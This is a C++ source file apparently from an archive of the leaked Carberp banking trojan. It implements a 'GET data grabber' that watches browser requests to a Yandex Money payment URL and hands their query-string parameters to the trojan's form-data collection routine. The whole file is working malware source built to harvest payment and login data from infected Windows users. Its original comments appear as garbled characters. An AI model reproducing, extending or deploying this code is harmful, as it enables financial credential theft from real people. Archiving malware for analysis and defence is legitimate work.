/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#pragma hdrstop

#include "Strings.h"
#include "Loader.h"
#include "GETDataGrabber.h"
//---------------------------------------------------------------------------


// ������ ����� ������ ������� ���������� ��������� ������
const static PCHAR GETDataURLMasks[] = {
		"https://s4.money.yandex.net*",
		NULL};




bool CanSendGETData(const char* URL)
{
	// ������� ��������� ������������� �������� ������ � ���������� ������
	for (int i = 0; GETDataURLMasks[i] != NULL; i++)
	{
		if (WildCmp((PCHAR)URL, GETDataURLMasks[i]))
			return true;
	}
	return false;
}

//----------------------------------------------------
//  �������, ��� �������������, ���������� GET ������
//  �� URL ������
//----------------------------------------------------
bool SendGETData(const char* URL, const char* UserAgent, DWORD BrowserType)
{
	// ���������� ������� �����������
	PCHAR Data = STRA::Scan(URL, '?');
	if (Data)
	{
		Data++;
		if (STRA::IsEmpty(Data))
			return false;
	}

	if (!CanSendGETData(URL))
		return false;

	string URLCopy;

	URLCopy.Copy(URL, 0, (Data - URL) - 1); 

	return DataGrabber::AddHTMLFormData(URLCopy.t_str(), Data, (PCHAR)UserAgent, BrowserType, DATA_TYPE_FORM);
	
}
